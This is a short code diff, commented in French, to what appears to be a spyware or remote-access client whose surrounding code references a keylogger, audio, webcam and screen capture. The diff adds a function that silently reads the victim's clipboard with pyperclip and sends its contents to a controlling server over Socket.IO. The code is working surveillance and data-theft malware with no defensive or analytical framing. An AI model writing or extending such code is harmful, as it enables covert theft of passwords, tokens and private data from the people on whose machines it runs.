@@ -7,6 +7,7 @@ import cv2
 import keyboard
 import pyaudio
 import pyautogui
+import pyperclip
 from PIL import Image
 
 
@@ -82,6 +83,18 @@ def record_and_send_keyboard_log(duration=10, sio=None):
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
 
+
+def get_clipboard_content(sio=None):
+    try:
+        print("Récupération du presse-papiers...")
+        clipboard_content = pyperclip.paste()
+        if clipboard_content and sio:
+            sio.emit('clipboard_response', {'clipboard_content': clipboard_content})
+            print("Contenu du presse-papiers envoyé au serveur via Socket.IO.")
+        else:
+            print("Aucun contenu trouvé dans le presse-papiers ou connexion au serveur Socket.IO manquante.")
+    except Exception as e:
+        print(f"Échec de la récupération du presse-papiers: {e}")
 
 def gen_frames(sio):
     try:
